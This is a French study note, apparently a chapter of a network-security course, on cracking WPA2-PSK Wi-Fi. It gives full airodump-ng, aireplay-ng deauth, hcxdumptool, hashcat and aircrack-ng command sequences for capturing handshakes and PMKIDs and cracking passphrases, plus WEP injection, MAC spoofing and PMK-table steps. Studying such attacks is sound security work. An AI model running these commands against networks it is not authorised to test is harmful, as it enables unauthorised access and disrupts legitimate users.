---
title: "Attaques WPA2-PSK"
domain: "Applied Sciences"
subdomain: "Computer Science > Security > Networking > Network Security > WiFi"
tags: [sciences-appliquées, informatique, sécurité, réseau, wifi, wpa2, pmkid, hashcat, aircrack, ppsk]
date: "2026-05-17"
prerequis: ["[[02 - Reconnaissance et Sniffing]]"]
---

# Attaques WPA2-PSK

Le mode WPA2-Personal utilise une PSK (Pre-Shared Key) commune. Le craquage est **toujours offline** : on capture une preuve cryptographique, puis on brute-force le mot de passe sans plus toucher au réseau.

## Le handshake 4-way en bref

```
Client (STA)                           AP
   |                                    |
   | <-------- 1. ANonce -------------- |
   |                                    |
   | --- 2. SNonce + MIC ------------>  |
   |                                    |
   | <-- 3. GTK + MIC ----------------- |
   |                                    |
   | --- 4. ACK --------------------->  |
```

La PTK (Pairwise Transient Key) dérive de :
```
PTK = PRF(PMK, ANonce || SNonce || AP_MAC || STA_MAC)
PMK = PBKDF2(PSK, SSID, 4096, 256)
```

Avec les 4 messages capturés + ESSID + MACs, on peut **vérifier offline** si une PSK candidate produit le bon MIC.

> [!important] Idée clé
> C'est ce qui rend l'attaque "silencieuse" après la capture : une fois le handshake obtenu, plus aucun paquet n'est envoyé vers l'AP ou le client — tout le brute-force se fait localement en recalculant le MIC pour chaque candidat. L'AP ne voit donc jamais les milliards de tentatives, contrairement à une attaque online (WPS, login web) qui, elle, est détectable et rate-limitable.

## Capture du handshake

```bash
# 1. Repérer la cible et fixer le canal
airodump-ng wlan0mon                          # noter BSSID + CH

# 2. Lancer la capture ciblée
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF \
  -w handshake wlan0mon
# → handshake-01.cap
# → en haut à droite : "WPA handshake: AA:BB:CC:DD:EE:FF" quand capturé

# 3. Forcer la capture via deauth (terminal séparé)
aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
# -a = AP, -c = client précis, 5 = nb de paquets deauth
# Sans -c → broadcast (moins efficace, certains clients ignorent)

# 4. Vérifier la qualité de la capture
aircrack-ng handshake-01.cap                  # "1 handshake" attendu

# Outil dédié plus fiable :
hcxpcapngtool handshake-01.cap -o hash.hc22000
# Échec ici = handshake incomplet, recapturer
```

**Astuce** : utiliser `--deauth 3` (pas 100) — un seul paquet suffit souvent et fait moins de bruit.

## PMKID Attack — sans client

Si l'AP est mal configuré (Wi-Fi simple, hotspot perso), il envoie le **PMKID** dans le premier message du handshake, **sans attendre qu'un client se connecte**.

```
PMKID = HMAC-SHA1-128(PMK, "PMK Name" || AP_MAC || Client_MAC)
```

```bash
# Capture orientée PMKID
hcxdumptool -i wlan0mon -o capture.pcapng \
  --enable_status=1

# Variante filtrée sur une cible précise
hcxdumptool -i wlan0mon -o capture.pcapng \
  --enable_status=1 \
  --filterlist_ap=target.txt --filtermode=2
# target.txt contient le BSSID au format aabbccddeeff

# Extraction
hcxpcapngtool capture.pcapng -o pmkid.hc22000 \
  --all                                # PMKID + EAPOL

# Crack
hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt
```

**Avantage** : pas besoin d'attendre ou de deauth (silencieux, plus rapide).
**Limite** : ne fonctionne pas si l'AP/802.11r est correctement configuré (PMKID absent ou aléatoire).

> [!tip] Méthode
> Contrairement au handshake classique qui nécessite qu'un client légitime se (ré)associe, le PMKID est envoyé par l'AP dès le tout premier message — donc sans deauth ni attente. En pratique, toujours tenter PMKID en premier (`hcxdumptool`), et ne basculer vers la capture de handshake classique que si l'AP ne le fournit pas.

## Cracking — aircrack-ng

Rapide pour les petits dictionnaires, **CPU only**.

```bash
# Crack basique
aircrack-ng handshake-01.cap -w rockyou.txt

# Avec un ESSID précis (si capture multi-réseaux)
aircrack-ng handshake-01.cap -e "MonReseau" -w rockyou.txt

# Plusieurs dictionnaires
aircrack-ng handshake-01.cap -w wordlist1.txt,wordlist2.txt
```

## Cracking — hashcat (recommandé, GPU)

Format moderne `.hc22000` (unifié WPA2 handshake + PMKID).

```bash
# Conversion
hcxpcapngtool handshake-01.cap -o hash.hc22000

# Attack mode 0 — dictionnaire pur
hashcat -m 22000 hash.hc22000 rockyou.txt

# Mode 0 + règles (transformations : MotDePasse → motdepasse2024, M0tDeP@sse!)
hashcat -m 22000 hash.hc22000 rockyou.txt -r rules/best64.rule
hashcat -m 22000 hash.hc22000 rockyou.txt -r rules/d3ad0ne.rule

# Mode 3 — brute-force masqué (8 chiffres = box opérateur EU souvent)
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d

# Masques personnalisés
hashcat -m 22000 hash.hc22000 -a 3 ?u?l?l?l?l?l?d?d   # Maj+5min+2chif

# Mode 6 — hybride : dictionnaire + masque
hashcat -m 22000 hash.hc22000 -a 6 rockyou.txt ?d?d?d

# Reprendre une session interrompue
hashcat -m 22000 hash.hc22000 rockyou.txt --session=wifi --restore

# Voir le résultat
hashcat -m 22000 hash.hc22000 --show
```

**Wordlists incontournables** :
- `rockyou.txt` (~14 M, mdp leakés 2009)
- `seclists/Passwords/WiFi-WPA/`
- Générées par `crunch` ou `cewl` (depuis un site)

## Réseau en PPSK : ce qui change pour l'attaquant

Certains réseaux WPA2-Personal acceptent plusieurs passphrases sur un même SSID, chacune liée à un VLAN : c'est le PPSK, décrit dans [[11 - Defense et Detection]]. Rien ne le signale dans les balises, qui affichent `PSK` comme n'importe quel réseau domestique. La capture et le cassage ne changent pas : le handshake ou le PMKID d'un client se cassent exactement comme plus haut, puisque chaque passphrase dérive sa propre PMK avec le même PBKDF2. Ce qui change, c'est ce que rapporte la clé trouvée.

D'abord, elle ne vaut que pour son groupe. Le handshake d'une caméra cassé donne la clé de la caméra, et donc l'accès au VLAN IoT, pas à celui des employés. Le choix de la cible compte : un appareil bon marché a souvent une clé courte ou d'usine, mais il ouvre aussi le VLAN le plus restreint.

Ensuite, elle ne déchiffre plus le trafic des autres. Avec une PSK unique, quiconque la connaît peut recalculer la PTK de chaque client dont il a capturé le handshake, et lire tout son trafic unicast. En PPSK, chaque client a sa propre PMK : connaître une clé ne donne que les sessions établies avec cette clé.

Enfin, une clé liée à une adresse MAC ne se réutilise pas telle quelle depuis un autre appareil. L'attaquant doit aussi usurper la MAC du client légitime (`macchanger -m`), ce qui suppose de l'avoir vue dans la capture et provoque un conflit si l'appareil est connecté au même moment.

> [!quiz] Pourquoi casser la passphrase d'un client en PPSK ne permet-il pas de déchiffrer le trafic des autres clients du même SSID ?
> Parce que chaque passphrase donne sa propre PMK, et que la PTK de chaque session en dérive. Avec une PSK unique, la PMK est commune et il suffit d'un handshake capturé pour recalculer la PTK de n'importe quel client. En PPSK, la clé cassée ne permet de recalculer que les PTK des sessions ouvertes avec cette même clé.

## WEP — historique (5 min)

WEP est **trivialement cassable** (IV de 24 bits réutilisés). Présent uniquement sur du matériel ancien.

```bash
# Capture massive de paquets (avec injection ARP pour accélérer)
airodump-ng -c 6 --bssid BSSID -w wep wlan0mon

# En parallèle : injection ARP (génère beaucoup d'IVs)
aireplay-ng --arpreplay -b BSSID -h MA_MAC wlan0mon

# Fake authentication (si l'AP filtre les sources)
aireplay-ng --fakeauth 0 -a BSSID -h MA_MAC wlan0mon

# Crack quand suffisamment d'IVs (~40 000+)
aircrack-ng wep-01.cap
# → clé révélée en quelques secondes
```

## Optimisations

| Astuce | Gain |
|--------|------|
| GPU récent (RTX 4080, RX 7900) | ~1.5 M H/s sur WPA2 |
| Liste rotée (`rockyou.txt` + `best64.rule`) | x60 candidats |
| Filtrer la wordlist (>= 8 chars, sans non-ASCII) | -30% inutile |
| Hashtopolis (distribué multi-GPU) | linéaire avec le nb de nodes |
| PSK opérateur (box ISP) — masques connus | minutes vs heures |

## Pré-calcul (PMK tables)

```bash
# Générer une rainbow table pour un SSID donné (PMK = PBKDF2(PSK, SSID, ...))
genpmk -f rockyou.txt -d pmk_MonReseau -s MonReseau

# Crack ultra-rapide via cowpatty
cowpatty -d pmk_MonReseau -r handshake-01.cap -s MonReseau
```

Utile si plusieurs handshakes partagent le même SSID (ex : chaîne de boutiques).
